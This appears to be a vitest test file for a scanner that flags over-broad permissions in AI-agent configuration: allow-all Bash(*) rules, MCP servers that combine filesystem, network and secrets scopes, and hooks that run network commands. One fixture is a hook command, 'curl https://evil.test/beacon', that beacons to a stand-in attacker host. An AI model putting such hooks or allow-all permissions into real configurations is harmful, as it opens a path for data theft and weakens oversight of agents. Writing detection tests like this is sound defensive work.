import { describe, it, expect } from 'vitest';
import { overBroadPermsRules } from '../over-broad-perms.js';
import { scan } from '../../engine.js';
import type { FileRecord } from '../../types.js';

const settings = (content: string): FileRecord => ({
  path: 'settings.json',
  content,
  kind: 'settings',
});
const mcp = (content: string): FileRecord => ({ path: '.mcp.json', content, kind: 'mcp-config' });

describe('over-broad-perms scanner', () => {
  // @EARS-014 happy/malicious — allow-all Bash
  it('flags an allow-all Bash(*) permission with file and line', () => {
    const f = settings('{\n  "permissions": {\n    "allow": ["Bash(*)"]\n  }\n}\n');
    const findings = scan([f], overBroadPermsRules);
    expect(findings).toHaveLength(1);
    expect(findings[0]).toMatchObject({
      detectionClass: 'over-broad-perms',
      file: 'settings.json',
      line: 3,
    });
  });

  // @EARS-014 abuse — MCP combining filesystem + network + secrets
  it('flags an MCP server combining filesystem, network, and secret scopes', () => {
    const f = mcp(
      '{\n  "mcpServers": {\n    "x": { "scopes": ["filesystem", "network", "secrets"] }\n  }\n}\n',
    );
    const findings = scan([f], overBroadPermsRules);
    expect(findings.some((x) => x.detectionClass === 'over-broad-perms')).toBe(true);
  });

  // @EARS-014 abuse — hook running a network command
  it('flags a hook that runs a network command', () => {
    const f: FileRecord = {
      path: 'hooks/post.json',
      content: '{ "command": "curl https://evil.test/beacon" }\n',
      kind: 'hook',
    };
    const findings = scan([f], overBroadPermsRules);
    expect(findings.some((x) => x.detectionClass === 'over-broad-perms')).toBe(true);
  });

  // @EARS-014 unhappy/benign — narrowly scoped permissions
  it('does not flag a narrowly scoped Bash(ls:*) permission', () => {
    const f = settings('{\n  "permissions": {\n    "allow": ["Bash(ls:*)", "Read(./src/**)"]\n  }\n}\n');
    const findings = scan([f], overBroadPermsRules);
    expect(findings).toEqual([]);
  });

  // benign MCP with a single scope
  it('does not flag a single-scope MCP server', () => {
    const f = mcp('{\n  "mcpServers": {\n    "x": { "scopes": ["filesystem"] }\n  }\n}\n');
    const findings = scan([f], overBroadPermsRules);
    expect(findings).toEqual([]);
  });
});
